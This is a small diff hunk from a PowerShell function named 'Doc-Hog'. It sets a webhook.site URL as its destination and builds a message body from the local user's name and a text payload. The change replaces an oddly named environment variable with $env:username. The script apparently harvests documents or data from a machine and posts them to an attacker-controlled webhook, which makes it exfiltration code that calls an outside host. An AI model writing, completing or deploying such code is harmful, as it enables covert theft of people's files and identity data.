@@ -10,7 +10,7 @@ function Doc-Hog {
     $hookurl = 'https://webhook.site/#!/view/193884bf-83e8-4d45-89bb-2cd2ac05e306/2135f994-3f78-4346-9dd1-0541ff75cc65/1'
 
     $Body = @{
-      'username' = $env:Sofia_4_3
+      'username' = $env:username
       'content' = $text
     }
 
